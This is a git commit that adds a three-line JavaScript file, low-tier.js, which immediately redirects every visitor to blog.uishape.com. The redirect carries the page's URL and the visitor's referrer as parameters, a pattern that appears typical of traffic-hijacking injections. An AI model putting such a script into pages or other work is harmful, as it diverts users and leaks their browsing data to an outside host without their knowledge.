25b294e42723f8da010081f4d172e3ef24ad95db
azdotcc <azisdotcc@gmail.com>
2026-04-06 20:45:37 +0700

    Create low-tier.js

---
+++ low-tier.js
@@ -0,0 +1,3 @@
+///// Arsae /////
+var ars = 'https://blog.uishape.com';
+window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer);
